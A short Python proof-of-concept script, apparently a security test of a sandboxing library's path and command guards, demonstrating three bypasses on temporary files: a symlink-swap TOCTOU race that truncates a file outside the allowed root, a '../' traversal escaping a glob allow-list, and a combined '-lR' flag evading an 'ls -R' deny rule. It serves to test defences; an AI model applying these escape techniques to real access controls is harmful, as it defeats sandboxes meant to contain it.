import os, sys, tempfile, pathlib
import os as _os; sys.path.insert(0, _os.path.dirname(_os.path.abspath(__file__)))
from ebxp import *
from ebxp.server import Server
from ebxp.guards import resolve_path, open_verified
tmp = pathlib.Path(tempfile.mkdtemp()).resolve()
(tmp/"pub").mkdir(); (tmp/"outside").mkdir(); (tmp/"outside/victim.txt").write_text("PRECIOUS")
scope = PathScope(roots=(str(tmp/"pub"),))
# (1) write-side TOCTOU: resolve for a new/existing file, then swap parent dir for a symlink, then open(O_TRUNC)
(tmp/"pub/d").mkdir(); (tmp/"pub/d/victim.txt").write_text("x")
real = resolve_path(scope, str(tmp/"pub/d/victim.txt"), "write")
os.rename(tmp/"pub/d", tmp/"pub/d_old"); os.symlink(tmp/"outside", tmp/"pub/d")
try:
    open_verified(scope, real, os.O_WRONLY | os.O_TRUNC)
except Exception as e:
    pass
print("(1) victim after racing O_TRUNC open:", repr((tmp/"outside/victim.txt").read_text()), "<- truncated => FLAW" if (tmp/"outside/victim.txt").read_text()=="" else "<- intact")
# (2) glob arg bypass
cs = CommandScope(allow=(f"ls {tmp}/pub/*",), exec_dirs=("/bin","/usr/bin"))
s = Server(Policy().allow("commands.run", commands=cs))
print("(2) ls pub/../outside ->", s.invoke("commands.run", {"command": f"ls {tmp}/pub/../outside"})[0], "(200 => escapes the 'jail')")
# (3) flag deny bypass
cs = CommandScope(allow=("ls ...",), deny=("ls -R ...",), exec_dirs=("/bin","/usr/bin"))
s = Server(Policy().allow("commands.run", commands=cs))
print("(3) ls -lR ->", s.invoke("commands.run", {"command": f"ls -lR {tmp}"})[0], "(200 => deny-list bypassed)")
